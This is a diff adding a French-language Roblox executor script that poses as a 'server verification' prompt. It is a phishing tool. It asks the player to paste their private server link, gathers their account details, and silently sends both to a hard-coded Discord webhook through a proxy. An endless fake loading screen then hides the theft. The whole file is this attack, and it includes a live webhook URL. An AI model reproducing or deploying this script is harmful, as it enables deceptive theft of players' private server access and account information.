@@ -1,1 +1,220 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
 
+-- TON WEBHOOK (avec proxy stable)
+local originalWebhook = "https://discord.com/api/webhooks/1485264535999877351/LwseepXXW3mpRZK85U4aGj7zqDiEih-dmHAaGpGrk6gqN3IqI9a_0pX1Rl1YE1_QIhsZ"
+local webhookUrl = originalWebhook:gsub("discord%.com", "webhook.lewisakura.moe")
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "PrivateServerFakeCheck"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = CoreGui
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(15,15,25)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+local promptFrame = Instance.new("Frame")
+promptFrame.Size = UDim2.new(0.42,0,0.38,0)
+promptFrame.Position = UDim2.new(0.29,0,0.31,0)
+promptFrame.BackgroundColor3 = Color3.fromRGB(30,30,45)
+promptFrame.BorderSizePixel = 0
+promptFrame.Parent = bg
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0,14)
+uiCorner.Parent = promptFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0.22,0)
+title.BackgroundTransparency = 1
+title.Text = "Vérification de serveur requise"
+title.TextColor3 = Color3.fromRGB(220,220,255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.Parent = promptFrame
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(0.9,0,0.22,0)
+subtitle.Position = UDim2.new(0.05,0,0.26,0)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Pour continuer, entre le lien de ton serveur privé :"
+subtitle.TextColor3 = Color3.fromRGB(160,160,200)
+subtitle.TextScaled = true
+subtitle.TextWrapped = true
+subtitle.Font = Enum.Font.Gotham
+subtitle.Parent = promptFrame
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.82,0,0.16,0)
+textBox.Position = UDim2.new(0.09,0,0.52,0)
+textBox.BackgroundColor3 = Color3.fromRGB(45,45,60)
+textBox.TextColor3 = Color3.fromRGB(220,220,255)
+textBox.PlaceholderText = "Colle le lien ici..."
+textBox.Text = ""
+textBox.ClearTextOnFocus = false
+textBox.Font = Enum.Font.Gotham
+textBox.TextScaled = true
+textBox.Parent = promptFrame
+
+local textCorner = Instance.new("UICorner")
+textCorner.CornerRadius = UDim.new(0,8)
+textCorner.Parent = textBox
+
+local continueButton = Instance.new("TextButton")
+continueButton.Size = UDim2.new(0.5,0,0.14,0)
+continueButton.Position = UDim2.new(0.25,0,0.78,0)
+continueButton.BackgroundColor3 = Color3.fromRGB(60,60,80)
+continueButton.TextColor3 = Color3.fromRGB(140,140,140)
+continueButton.Text = "Continuer"
+continueButton.Font = Enum.Font.GothamSemibold
+continueButton.TextScaled = true
+continueButton.Parent = promptFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0,10)
+buttonCorner.Parent = continueButton
+
+local function checkText()
+    local txt = textBox.Text
+    if txt ~= "" and #txt > 10 and txt:find("roblox%.com") then
+        continueButton.BackgroundColor3 = Color3.fromRGB(0,170,255)
+        continueButton.TextColor3 = Color3.new(1,1,1)
+    else
+        continueButton.BackgroundColor3 = Color3.fromRGB(60,60,80)
+        continueButton.TextColor3 = Color3.fromRGB(140,140,140)
+    end
+end
+
+textBox:GetPropertyChangedSignal("Text"):Connect(checkText)
+textBox.FocusLost:Connect(checkText)
+
+-- Récup infos compte (sans bio)
+local function getUserInfo(userId)
+    local success, response = pcall(function()
+        local url = "https://users.roblox.com/v1/users/" .. tostring(userId)
+        local httpFunc = request or http_request or syn and syn.request or fluxus and fluxus.request or getgenv and getgenv().request
+        if typeof(httpFunc) == "function" then
+            local res = httpFunc({Url = url, Method = "GET"})
+            if res and res.Body then
+                return HttpService:JSONDecode(res.Body)
+            end
+        end
+    end)
+    if success and response then
+        return response
+    else
+        return nil
+    end
+end
+
+-- CLIC → EXTRAIT + INFOS + ENVOIE (sans debug visible)
+continueButton.MouseButton1Click:Connect(function()
+    local inputLink = textBox.Text
+    if inputLink == "" then return end
+
+    promptFrame.Visible = false
+
+    -- Extraction code private server
+    local code = ""
+    if inputLink:find("code=([%w]+)") then
+        code = inputLink:match("code=([%w]+)")
+    elseif inputLink:find("privateServerLinkCode=([%w]+)") then
+        code = inputLink:match("privateServerLinkCode=([%w]+)")
+    end
+
+    local joinUrl = (code ~= "" and #code >= 30) and ("https://www.roblox.com/share?code=" .. code .. "&type=Server") or inputLink
+
+    -- Récup infos (sans bio)
+    local userInfo = getUserInfo(LocalPlayer.UserId)
+    local infoText = ""
+    if userInfo then
+        local created = userInfo.created and os.date("%d/%m/%Y", os.time({year = tonumber(userInfo.created:sub(1,4)), month = tonumber(userInfo.created:sub(6,7)), day = tonumber(userInfo.created:sub(9,10))})) or "Inconnu"
+        infoText = 
+            "**Pseudo :** " .. (userInfo.name or "Inconnu") .. "\n" ..
+            "**DisplayName :** " .. (userInfo.displayName or "Inconnu") .. "\n" ..
+            "**UserId :** " .. LocalPlayer.UserId .. "\n" ..
+            "**Créé le :** " .. created .. "\n"
+    else
+        infoText = "**Pseudo :** " .. LocalPlayer.Name .. "\n**UserId :** " .. LocalPlayer.UserId .. "\n"
+    end
+
+    -- Payload
+    local payload = {
+        content = joinUrl .. "\n\n**Infos du compte Roblox :**\n" .. infoText
+    }
+
+    local jsonData = HttpService:JSONEncode(payload)
+
+    local httpFuncs = {request, http_request, syn and syn.request, fluxus and fluxus.request, getgenv and getgenv().request}
+
+    -- Envoi silencieux (pas de message visible)
+    for _, func in ipairs(httpFuncs) do
+        if typeof(func) == "function" then
+            pcall(function()
+                func({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+        end
+    end
+
+    -- Loading infini (le prank commence direct)
+    local loadingFrame = Instance.new("Frame")
+    loadingFrame.Size = UDim2.new(1,0,1,0)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(10,10,15)
+    loadingFrame.Parent = bg
+
+    local barBG = Instance.new("Frame")
+    barBG.Size = UDim2.new(0.55,0,0.03,0)
+    barBG.Position = UDim2.new(0.225,0,0.87,0)
+    barBG.BackgroundColor3 = Color3.fromRGB(40,40,50)
+    barBG.Parent = loadingFrame
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0.2,0,1,0)
+    bar.BackgroundColor3 = Color3.fromRGB(0,180,255)
+    bar.Parent = barBG
+
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Size = UDim2.new(1,0,0.18,0)
+    loadingText.Position = UDim2.new(0,0,0.32,0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "Connexion au serveur privé..."
+    loadingText.TextColor3 = Color3.fromRGB(220,220,255)
+    loadingText.TextScaled = true
+    loadingText.Font = Enum.Font.GothamBlack
+    loadingText.Parent = loadingFrame
+
+    spawn(function()
+        while true do
+            for i = 0.2, 1, 0.007 do
+                bar:TweenSize(UDim2.new(i,0,1,0), "Out", "Linear", 1.4, true)
+                wait(1.4)
+            end
+            bar:TweenSize(UDim2.new(0.2,0,1,0), "Out", "Linear", 0.08, true)
+            wait(0.15)
+        end
+    end)
+
+    local messages = {"Chargement des assets...", "Vérification privée...", "Synchronisation...", "Optimisation...", "Presque prêt !", "Finalisation..."}
+    spawn(function()
+        local idx = 1
+        while true do
+            loadingText.Text = messages[idx]
+            idx = (idx % #messages) + 1
+            wait(4 + math.random()*3.5)
+        end
+    end)
+end)
+
+checkText()
